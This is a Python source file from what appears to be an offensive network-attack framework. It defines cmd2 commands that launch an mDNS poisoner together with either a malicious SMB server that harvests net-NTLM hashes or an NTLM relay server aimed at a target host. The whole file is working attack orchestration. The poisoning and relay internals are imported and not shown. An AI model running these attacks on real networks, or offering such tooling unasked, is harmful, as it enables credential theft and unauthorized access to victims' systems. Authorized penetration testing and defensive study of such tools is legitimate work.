from cmd2.command_definition import with_default_category
from cmd2 import CommandSet, with_default_category, Cmd2ArgumentParser, with_argparser
import argparse

from .servers.smbserver import MaliciousSmbServer, NtlmRelayServer
from .Poison import MDNS
from multiprocessing import Process
from threading import Thread


@with_default_category("Man in the middle attacks")
class SmbServerAttack(CommandSet):
    """[ Class containing smbrelay attack ]"""

    def __init__(self) -> None:

        super().__init__()

    def config_poison_and_server(
        self, mdns_poisoner: MDNS, smbserver: NtlmRelayServer
    ) -> None:
        """[ Function to launch the threads that will control the mdns poisoner and the smb server]

        Args:
            mdns_poisoner (MDNS): [ variable with the mdns poisoner Object ]
            smbserver (SmbServer): [ variable with the SmbServer Object ]
        """
        mdns_thread = Thread(target=mdns_poisoner.start_mdns_poisoning)
        mdns_thread.daemon = True

        smbserver_thread = Thread(target=smbserver.start_malicious_smbserver)
        smbserver_thread.daemon = True

        mdns_thread.start()
        smbserver_thread.start()

        # I only wait for a thread because when you finish the process you have to finish
        smbserver_thread.join()

    argParser = Cmd2ArgumentParser(
        description="""Malicious smb server attack to get hashes net-NTLMV """
    )
    argParser.add_argument(
        "-SS",
        "--show_settable",
        action="store_true",
        help="Show Settable variables for this command",
    )

    @with_argparser(argParser)
    def do_mss(self, args: argparse.Namespace) -> None:
        """[ Command to create a malicious smb server to get ntlm hashes ]

        Args:
            args (argparse.Namespace): [Arguments passed to the smb_relay command]
        """

        mdns_poisoner = MDNS(
            self._cmd.LHOST,
            self._cmd.IPV6,
            self._cmd.MAC_ADDRESS,
            self._cmd.INTERFACE,
        )

        # output in case of -SS command
        smbserver = MaliciousSmbServer(self._cmd.LHOST, self._cmd.LPORT)

        self._cmd.info_logger.debug(
            f"""Starting malicious smb server attack using ip: {self._cmd.LHOST} ipv6:{self._cmd.IPV6}
            interface: {self._cmd.INTERFACE} mac_address:{self._cmd.MAC_ADDRESS} lport:{self._cmd.LPORT}"""
        )

        settable_variables_required = {
            "LHOST": self._cmd.LHOST,
            "IPV6": self._cmd.IPV6,
            "INTERFACE": self._cmd.INTERFACE,
            "MAC_ADDRESS": self._cmd.MAC_ADDRESS,
            "LPORT": self._cmd.LPORT,
        }
        if args.show_settable:
            self._cmd.show_settable_variables_necessary(settable_variables_required)
        elif self._cmd.check_settable_variables_value(settable_variables_required):

            attack = Process(
                target=self.config_poison_and_server, args=(mdns_poisoner, smbserver)
            )
            attack.start()
            try:
                # If ctrl+c then the process terminate and smb_relay exits
                attack.join()
            except KeyboardInterrupt:
                attack.terminate()
                attack.join()
                self._cmd.error_logger.warning("Exiting smb relay attack ...")


class NtlmRelay(CommandSet):
    def __init__(self):
        super().__init__()

    def config_poison_and_server(
        self, mdns_poisoner: MDNS, ntlm_relay_attack: NtlmRelayServer
    ) -> None:
        """[ Function to launch the threads that will control the mdns poisoner and the smb server]

        Args:
            mdns_poisoner (MDNS): [ variable with the mdns poisoner Object ]
            smbserver (SmbServer): [ variable with the SmbServer Object ]
        """
        mdns_thread = Thread(target=mdns_poisoner.start_mdns_poisoning)
        mdns_thread.daemon = True

        mdns_thread.start()
        ntlm_relay_attack.start_ntlm_relay_server()

    argParser = Cmd2ArgumentParser(
        description="""Command to perform ntlm relay attack"""
    )
    argParser.add_argument(
        "-SS",
        "--show_settable",
        action="store_true",
        help="Show Settable variables for this command",
    )

    @with_argparser(argParser)
    def do_ntlm_relay(self, args: argparse.Namespace) -> None:
        """[ Command to perform ntlm relay attack ]

        Args:
            args (argparse.Namespace): [Arguments passed to the ntlm relay attack ]
        """

        mdns_poisoner = MDNS(
            self._cmd.LHOST,
            self._cmd.IPV6,
            self._cmd.MAC_ADDRESS,
            self._cmd.INTERFACE,
        )

        # output in case of -SS command
        ntlm_relay_attack = NtlmRelayServer(
            self._cmd.LHOST, self._cmd.LPORT, self._cmd.RHOST
        )

        self._cmd.info_logger.debug(
            f"""Starting ntlm relay attack using lhost: {self._cmd.LHOST} rhost:{self._cmd.RHOST} ipv6:{self._cmd.IPV6}
            interface: {self._cmd.INTERFACE} mac_address:{self._cmd.MAC_ADDRESS} lport:{self._cmd.LPORT}"""
        )

        settable_variables_required = {
            "LHOST": self._cmd.LHOST,
            "RHOST": self._cmd.RHOST,
            "IPV6": self._cmd.IPV6,
            "INTERFACE": self._cmd.INTERFACE,
            "MAC_ADDRESS": self._cmd.MAC_ADDRESS,
            "LPORT": self._cmd.LPORT,
        }
        if args.show_settable:
            self._cmd.show_settable_variables_necessary(settable_variables_required)
        elif self._cmd.check_settable_variables_value(settable_variables_required):

            attack = Process(
                target=self.config_poison_and_server,
                args=(mdns_poisoner, ntlm_relay_attack),
            )
            attack.start()
            try:
                # If ctrl+c then the process terminate and smb_relay exits
                attack.join()
            except KeyboardInterrupt:
                attack.terminate()
                attack.join()
                self._cmd.error_logger.warning("Exiting smb relay attack ...")
